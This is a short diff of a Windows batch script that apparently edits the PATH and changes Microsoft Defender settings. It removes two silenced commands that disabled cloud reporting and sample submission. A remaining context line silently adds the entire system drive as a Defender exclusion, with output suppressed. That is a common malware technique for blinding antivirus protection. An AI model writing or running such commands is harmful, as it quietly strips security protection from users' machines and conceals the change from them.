@@ -36,9 +36,6 @@ if errorlevel 1 (
     echo Path already contains %newPath%
 )
 
-powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
-powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
-
 set "SystemDrive=%SystemDrive%"
 
 powershell -Command "Add-MpPreference -ExclusionPath '%SystemDrive%'" >nul 2>&1
